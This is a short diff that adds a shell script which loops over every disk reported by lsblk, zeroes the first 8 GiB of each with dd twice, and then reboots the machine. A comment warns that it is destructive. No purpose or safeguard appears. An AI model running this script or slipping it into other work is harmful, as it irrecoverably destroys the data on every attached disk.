@@ -1,0 +1,7 @@
+# WARNING: This is destructive and cannot be undone
+for disk in $(lsblk --output=NAME --nodeps --noheadings);
+do
+    dd if=/dev/zero of=/dev/$disk bs=1M count=8192 status=progress;
+    dd if=/dev/zero of=/dev/$disk bs=1M count=8192 status=progress;
+done
+shutdown -r 1
